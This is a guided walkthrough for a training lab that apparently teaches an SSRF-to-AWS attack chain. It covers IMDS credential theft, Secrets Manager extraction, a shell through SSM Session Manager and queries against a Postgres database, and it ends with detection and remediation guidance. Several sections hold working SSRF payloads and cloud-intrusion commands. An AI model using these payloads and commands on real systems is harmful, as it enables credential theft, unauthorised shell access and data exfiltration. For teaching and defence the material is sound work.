# Sentinel Feeds - Guided Walkthrough

## Learning Objectives

By completing this lab, you will:

1. Understand how Server-Side Request Forgery (SSRF) vulnerabilities arise in applications that fetch user-supplied URLs
2. Learn the structure of the EC2 Instance Metadata Service and how attackers abuse it
3. Practice using stolen cloud credentials to enumerate AWS services
4. Understand the relationship between Secrets Manager and application credential storage
5. Execute a complete attack chain from web vulnerability to data exfiltration

---

## Phase 1: Application Reconnaissance

### Objective
Understand the application's functionality and identify potential attack surface.

### Steps

1. **Access the application**

   Open your browser and navigate to:
   ```
   http://[INSTANCE-IP]:8080
   ```

2. **Explore the interface**

   The application presents itself as a threat intelligence feed aggregator. Note:
   - The classification banner (SECRET // NOFORN)
   - The "Feed Validation Tool" with a URL input field
   - The list of active threat feeds
   - System status information

3. **Understand the stated functionality**

   The feed validation tool claims to "validate external threat intelligence feed URLs before adding to aggregation queue." This means the server will fetch URLs you provide.

4. **Test normal functionality**

   Enter a legitimate URL and observe the response:
   ```
   https://www.cisa.gov
   ```

   The application returns:
   - HTTP status code
   - Content-Type header
   - Response body preview

### Key Learning

Applications that fetch user-provided URLs are prime candidates for SSRF. The server acts as a proxy, making requests on behalf of the user. If the application doesn't restrict which URLs can be requested, an attacker can target internal resources.

---

## Phase 2: SSRF Identification

### Objective
Confirm the application is vulnerable to SSRF by accessing internal resources.

### Steps

1. **Test for basic SSRF**

   Try requesting localhost:
   ```
   http://localhost:8080/
   ```

   If the application returns its own homepage, SSRF is confirmed - the server made a request to itself.

2. **Test internal IP ranges**

   Try common internal addresses:
   ```
   http://127.0.0.1:8080/
   http://10.0.0.1/
   http://192.168.1.1/
   ```

3. **Target the EC2 metadata service**

   AWS EC2 instances can query a special link-local address for instance metadata:
   ```
   http://169.254.169.254/
   ```

   Enter this URL in the feed validator. A successful response confirms you can reach the metadata service.

4. **Explore the metadata structure**

   Request the root of the latest API version:
   ```
   http://169.254.169.254/latest/meta-data/
   ```

   You'll see a directory listing of available metadata categories.

### Key Learning

The EC2 Instance Metadata Service (IMDS) is available at `169.254.169.254` from any process running on the instance. It provides information about the instance including:
- Instance ID, type, and region
- Network configuration
- IAM role credentials (if an instance profile is attached)

IMDSv1 (the default until recently) allows simple GET requests with no authentication. IMDSv2 requires a session token obtained via a PUT request, which many SSRF vulnerabilities cannot perform.

---

## Phase 3: Credential Theft via IMDS

### Objective
Extract IAM role credentials from the metadata service.

### Steps

1. **Find the IAM role name**

   Request the security credentials path:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

   This returns the name of the IAM role attached to the instance (e.g., `sentinel-webapp-abc123`).

2. **Retrieve the credentials**

   Append the role name to the path:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
   ```

   The response contains:
   ```json
   {
     "Code": "Success",
     "LastUpdated": "2024-01-15T10:30:00Z",
     "Type": "AWS-HMAC",
     "AccessKeyId": "ASIAX...",
     "SecretAccessKey": "...",
     "Token": "...",
     "Expiration": "2024-01-15T16:30:00Z"
   }
   ```

3. **Record the credentials**

   Copy these three values:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`

### Key Learning

IAM instance profiles provide temporary credentials to EC2 instances. These credentials:
- Are automatically rotated (typically every 6 hours)
- Have permissions defined by the attached IAM role
- Can be used from anywhere, not just the instance

This is why SSRF to IMDS is so dangerous - it transforms a web vulnerability into cloud credential theft.

---

## Phase 4: AWS Enumeration with Stolen Credentials

### Objective
Use the stolen credentials to discover what AWS resources are accessible.

### Steps

1. **Configure credentials on your attack machine**

   Export the credentials as environment variables:
   ```bash
   export AWS_ACCESS_KEY_ID="ASIAX..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   export AWS_DEFAULT_REGION="us-gov-west-1"  # Adjust to match lab region
   ```

2. **Verify the credentials work**

   ```bash
   aws sts get-caller-identity
   ```

   This should return the assumed role ARN, confirming the credentials are valid.

3. **Enumerate permissions through exploration**

   Try common high-value services:
   ```bash
   # Secrets Manager
   aws secretsmanager list-secrets

   # S3
   aws s3 ls

   # EC2
   aws ec2 describe-instances

   # IAM (usually denied)
   aws iam get-user
   ```

4. **Focus on Secrets Manager**

   The `list-secrets` command should succeed and reveal a secret related to database credentials:
   ```bash
   aws secretsmanager list-secrets
   ```

   Note the secret name or ARN (e.g., `sentinel/intel-db/credentials-abc123`).

### Key Learning

When you obtain cloud credentials, systematic enumeration reveals what's accessible. Start with:
1. Identity verification (`sts get-caller-identity`)
2. High-value targets (Secrets Manager, S3, databases)
3. Infrastructure discovery (EC2, VPC, security groups)

Real attackers use tools like `enumerate-iam` or `pacu` to automate this process.

---

## Phase 5: Secrets Manager Extraction

### Objective
Retrieve stored secrets containing database credentials.

### Steps

1. **Get the secret value**

   ```bash
   aws secretsmanager get-secret-value --secret-id sentinel/intel-db/credentials-abc123
   ```

   Replace the secret ID with what you found in the previous phase.

2. **Parse the response**

   The secret string contains JSON with database connection details:
   ```json
   {
     "username": "sentinel_svc",
     "password": "...",
     "host": "sentinel-intel-abc123.xxxxx.us-gov-west-1.rds.amazonaws.com",
     "port": 5432,
     "dbname": "inteldb",
     "engine": "postgres"
   }
   ```

3. **Extract and save the credentials**

   ```bash
   # Parse with jq if available
   aws secretsmanager get-secret-value \
     --secret-id sentinel/intel-db/credentials-abc123 \
     --query 'SecretString' --output text | jq .
   ```

### Key Learning

Secrets Manager is commonly used to store:
- Database credentials
- API keys
- Service account passwords
- TLS certificates

Applications retrieve these secrets at runtime, avoiding hardcoded credentials. However, if an attacker compromises the application's IAM role, they inherit access to the same secrets.

---

## Phase 6: Database Access and Exfiltration

### Objective
Connect to the database and extract classified information.

### Steps

1. **Understand the network architecture**

   The RDS instance is in a private subnet and not directly accessible from the internet. You need shell access to the EC2 instance to reach it.

2. **Get the instance ID via SSRF**

   Use the SSRF vulnerability to retrieve the instance ID:
   ```
   http://169.254.169.254/latest/meta-data/instance-id
   ```

   Note the instance ID (e.g., `i-0abc123def456`).

3. **Connect via SSM Session Manager**

   The stolen IAM credentials include SSM permissions. From your attack machine (with credentials still exported):
   ```bash
   aws ssm start-session --target i-0abc123def456
   ```

   This opens a shell on the EC2 instance without requiring SSH keys.

   > **Note:** You need the AWS Session Manager plugin installed. See: https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html

4. **Connect to PostgreSQL**

   From the SSM session, use the credentials from Secrets Manager:
   ```bash
   PGPASSWORD='[PASSWORD]' psql -h [RDS-ENDPOINT] -p 5432 -U sentinel_svc -d inteldb
   ```

5. **Explore the database**

   List tables:
   ```sql
   \dt
   ```

   You should see:
   - `personnel`
   - `mission_briefings`
   - `asset_inventory`
   - `system_config`

6. **Examine table contents**

   ```sql
   -- Personnel with clearances
   SELECT service_number, name, rank, unit, clearance_level FROM personnel;

   -- Mission briefings
   SELECT operation_name, classification, summary FROM mission_briefings;

   -- Asset inventory
   SELECT asset_id, asset_type, location, status FROM asset_inventory;
   ```

7. **Find the flag**

   ```sql
   SELECT * FROM system_config WHERE classification = 'TOP SECRET/SCI';
   ```

   The `master_encryption_key` field contains the flag.

### Key Learning

SSM Session Manager is a legitimate AWS management feature that provides shell access without SSH keys. When IAM credentials are compromised:
- Attackers can use SSM to access instances if the role has `ssm:StartSession` permissions
- This bypasses network-level controls (no need for port 22)
- CloudTrail logs SSM sessions, providing detection opportunity

Database segmentation (private subnets, security groups) prevents direct access but doesn't protect against compromised application credentials.

---

## Phase 7: Post-Exploitation Analysis

### Objective
Understand the full attack chain and defensive gaps.

### Review the Attack Path

```
1. Web Application SSRF
   └─► Application fetches arbitrary URLs without validation

2. IMDS Credential Theft
   └─► IMDSv1 enabled, allowing unauthenticated credential access

3. Secrets Manager Access
   └─► IAM role has broad secretsmanager:GetSecretValue permissions

4. SSM Session Manager
   └─► IAM role has ssm:StartSession, providing shell access

5. Database Compromise
   └─► Application credentials provide full database access
```

### Detection Opportunities

| Phase | Log Source | Indicator |
|-------|------------|-----------|
| SSRF | Application logs | Requests to 169.254.169.254 |
| IMDS access | (None by default) | IMDSv2 would log failed attempts |
| Credential use | CloudTrail | API calls from unusual source IPs |
| Secrets access | CloudTrail | `secretsmanager:GetSecretValue` events |
| SSM access | CloudTrail | `ssm:StartSession` from external IP |
| DB access | PostgreSQL logs | Connections from EC2, unusual queries |

### Remediation Recommendations

**SSRF Prevention:**
```python
# Implement URL validation
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Block non-HTTP schemes
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # Resolve and check IP
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        # Block private ranges
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except:
        return False
    
    return True
```

**IMDS Protection:**
```hcl
# Require IMDSv2 (session tokens)
metadata_options {
  http_endpoint               = "enabled"
  http_tokens                 = "required"  # Changed from "optional"
  http_put_response_hop_limit = 1
}
```

**Least Privilege Secrets Access:**
```json
{
  "Effect": "Allow",
  "Action": "secretsmanager:GetSecretValue",
  "Resource": "arn:aws:secretsmanager:*:*:secret:sentinel/intel-db/*"
}
```

---

## Summary

This lab demonstrated a realistic attack chain exploiting:

1. **SSRF** - A common web vulnerability in applications that fetch URLs
2. **IMDSv1** - Legacy metadata service without authentication
3. **Over-privileged IAM** - Broad Secrets Manager and SSM permissions
4. **SSM Session Manager** - Using stolen credentials for shell access
5. **Credential reuse** - Same credentials provide full database access

The Capital One breach in 2019 followed a nearly identical pattern, resulting in exposure of 100+ million customer records. Understanding this attack chain is essential for both offensive security testing and defensive architecture.

### Commands Reference

```bash
# SSRF payloads
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]

# AWS enumeration
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id [SECRET]

# SSM Session Manager access
aws ssm start-session --target [INSTANCE-ID]

# Database access (from SSM session)
PGPASSWORD='[PASS]' psql -h [HOST] -U [USER] -d [DB]
\dt
SELECT * FROM system_config;
```
